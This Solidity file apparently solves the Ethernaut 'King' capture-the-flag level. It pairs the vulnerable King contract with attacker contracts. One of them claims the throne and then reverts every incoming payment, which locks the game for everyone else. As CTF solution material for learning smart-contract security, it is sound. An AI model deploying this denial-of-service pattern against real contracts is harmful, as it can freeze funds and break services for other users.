pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}


contract Attack{

    function giveToken(address payable king) public payable{
            king.call.gas(1000000).value(msg.value)("");
    }

    receive() external payable {
        revert();
    }
}



contract KingA {
    address levelInstance;

    constructor(address _levelInstance) public{
        levelInstance = _levelInstance;
    }

    function give() public payable {
        levelInstance.call{value: msg.value}("");
    }
}